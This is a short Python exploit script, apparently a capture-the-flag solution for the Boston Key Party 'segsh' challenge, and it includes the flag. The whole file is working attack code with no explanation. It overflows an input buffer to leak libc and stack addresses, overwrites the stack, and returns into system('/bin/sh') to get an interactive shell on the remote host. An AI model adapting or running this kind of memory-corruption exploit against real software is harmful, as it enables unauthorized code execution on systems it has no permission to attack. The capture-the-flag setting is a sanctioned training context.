from pwnlib import *


"""
BKP{Playing little games with Segmentation}
"""

libc_offset = 0xb000
libc_got_offset = 0x1aa000 + libc_offset

write = 0x4d
read = 0x6f
_exit = 0xb


#s = Socket(("localhost", 4442))
s = Socket(("segsh.bostonkey.party", 8888))

def clear():
	return s.ru("> __")

clear()
s.send("install -i echo\n")
clear()


# leak the libc got

payload = "A"*0x3fc
payload += pd(write)
payload += pd(0)
payload += pd(0x10000 + libc_got_offset + 12)
payload += pd(4)

s.send("exec -e echo\n")
s.ru("string: ")
s.send(payload)
s.ru(payload)
leaked = s.ru("'Input string: ")
libc_base = ud(leaked) - 0x17366
print "libc base: 0x%x" % libc_base

# leak to find the stack

payload = "A"*0x3fc
payload += pd(write)
payload += pd(0)
payload += pd(0x10000 + libc_offset + 0x001ABE00)
payload += pd(4)

s.send(payload)
s.ru(payload)
leaked = s.ru("'Input string: ")
stack = ud(leaked) - 0x634
print "stack:     0x%x" % stack


# overwrite the stack!

base = libc_base - libc_offset
payload = "A"*0x3fc
payload += pd(read)
payload += pd(_exit)
payload += pd(0x10000 + stack - base + 4)
payload += pd(0x100)

s.send(payload)


raw_input("> ")

system = libc_base + 0x40190
bin_sh = libc_base + 0x160A24

payload  = pd(system)
payload += pd(0xdead)
payload += pd(bin_sh)


s.send(payload)

print "shell?"


s.interact()


